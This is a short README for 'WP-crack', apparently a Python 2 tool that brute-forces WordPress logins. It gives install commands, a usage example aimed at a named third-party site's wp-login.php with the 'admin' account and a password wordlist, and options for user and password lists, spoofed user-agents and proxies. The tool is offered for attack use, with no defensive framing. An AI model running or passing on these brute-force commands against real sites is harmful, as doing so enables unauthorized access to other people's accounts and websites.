# WP-crack

# Installation :

pkg install python2

pkg install git

git clone https://github.com/SultanNasution/WP-crack

# Usage :

cd WP-crack

python2 wpbf.py -h http://neokopoi.com/wp-login.php -u admin -P wordlist.txt
 
# OPTIONS :

Syntax: python WP-crack [-u USER|-U FILE] [-p PASS|-P FILE] -h URL [OPT]
    
    -h URL
    -U file contain list user
    -P file contain list password
    -u username
    -p password
    -v verbose mode / show login+pass combination for each attempt
    -f continue after found login/password pair
    -g user-agent - default: "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0"
    -x use proxy | ex: 127.0.0.1:1234
  
